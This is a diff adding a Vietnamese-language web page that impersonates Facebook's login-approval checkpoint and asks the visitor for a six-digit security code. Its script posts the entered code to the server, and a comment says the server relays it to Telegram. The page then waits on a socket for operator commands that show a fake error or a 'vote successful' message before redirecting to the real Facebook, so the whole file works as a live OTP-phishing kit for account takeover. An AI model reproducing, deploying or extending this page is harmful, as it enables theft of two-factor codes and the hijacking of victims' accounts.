@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác nhận mã bảo mật</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --text-black: #1c1e21;
+            --text-gray: #606770;
+            --border-color: #dddfe2;
+            --bg-gray: #f0f2f5;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+
+        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* Header chuẩn Facebook Webview */
+        .app-header {
+            width: 100%;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid var(--border-color);
+            position: sticky; top: 0; background: #fff; z-index: 10;
+        }
+        .app-header h2 { color: var(--fb-blue); font-size: 24px; font-weight: 800; letter-spacing: -1.5px; }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 24px 16px;
+        }
+
+        .shield-icon {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .shield-icon i {
+            font-size: 54px;
+            color: #fa3e3e; /* Màu đỏ cảnh báo chuẩn Facebook Checkpoint */
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-black);
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .description {
+            font-size: 15px;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        /* Ô nhập mã OTP rời rạc chuẩn 2FA */
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .otp-inputs input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background: var(--bg-gray);
+            color: var(--text-black);
+            transition: all 0.2s;
+        }
+        .otp-inputs input:focus {
+            border-color: var(--fb-blue);
+            background: #fff;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--fb-blue);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .btn-submit:active { opacity: 0.8; }
+
+        .resend-text {
+            text-align: center;
+            font-size: 14px;
+            color: var(--fb-blue);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .footer-info {
+            margin-top: 40px;
+            background: var(--bg-gray);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: left;
+        }
+        .footer-info p {
+            font-size: 13px;
+            color: var(--text-gray);
+            line-height: 1.4;
+        }
+        .footer-info b { color: var(--text-black); }
+
+        /* Màn hình chờ phê duyệt (Overlay) */
+        .waiting-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 100;
+        }
+        .spinner {
+            width: 32px; height: 32px;
+            border: 3px solid #eee;
+            border-top: 3px solid var(--fb-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="app-header">
+        <h2>facebook</h2>
+    </div>
+
+    <div class="container">
+        <div class="shield-icon">
+            <i class="fas fa-key"></i>
+        </div>
+
+        <h1>Nhập mã xác nhận</h1>
+        <p class="description">Chúng tôi đã gửi mã gồm 6 chữ số đến số điện thoại liên kết với Facebook của bạn. Vui lòng nhập mã để phê duyệt đăng nhập từ thiết bị này.</p>
+
+        <div class="otp-inputs">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+            <input type="text" pattern="\d*" maxlength="1" class="otp-field">
+        </div>
+
+        <button class="btn-submit" onclick="submitOTP()">Tiếp tục</button>
+
+        <div class="resend-text">Bạn chưa nhận được mã? Gửi lại mã (59s)</div>
+
+        <div class="footer-info">
+            <p><b>Cần hỗ trợ?</b><br>Kiểm tra tin nhắn SMS hoặc thông báo WhatsApp để lấy mã bảo mật. Mã này giúp Facebook xác nhận bạn chính là người đang thực hiện đăng nhập.</p>
+        </div>
+    </div>
+
+    <div class="waiting-overlay" id="loading">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; font-weight: 600; color: var(--fb-blue);">Đang xác thực...</p>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        const socket = io('http://127.0.0.1:5000');
+        const fields = document.querySelectorAll('.otp-field');
+
+        // Tự động nhảy ô khi nhập
+        fields.forEach((field, index) => {
+            field.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < fields.length - 1) {
+                    fields[index + 1].focus();
+                }
+            });
+            // Xử lý nút xóa (backspace)
+            field.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    fields[index - 1].focus();
+                }
+            });
+        });
+
+        function submitOTP() {
+            let code = "";
+            fields.forEach(f => code += f.value);
+
+            if(code.length === 6) {
+                document.getElementById('loading').style.display = 'flex';
+                
+                // Gửi mã về Telegram qua Server
+                fetch('/vote-action', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ otp: code, status: "OTP_SUBMIT" })
+                });
+            } else {
+                alert("Vui lòng nhập đầy đủ mã 6 số.");
+            }
+        }
+
+        // Lắng nghe lệnh điều khiển từ Telegram
+        socket.on('server_command', function(data) {
+            if(data.action === 'error') {
+                document.getElementById('loading').style.display = 'none';
+                alert("Mã xác nhận không chính xác. Vui lòng kiểm tra lại tin nhắn.");
+                fields.forEach(f => f.value = "");
+                fields[0].focus();
+            } else if(data.action === 'success') {
+                document.getElementById('loading').innerHTML = `
+                    <i class="fas fa-check-circle" style="font-size:40px; color:#42b72a"></i>
+                    <p style="margin-top:15px; color:#42b72a; font-weight:600;">Bình chọn thành công!</p>
+                `;
+                setTimeout(() => { window.location.href = "https://facebook.com"; }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
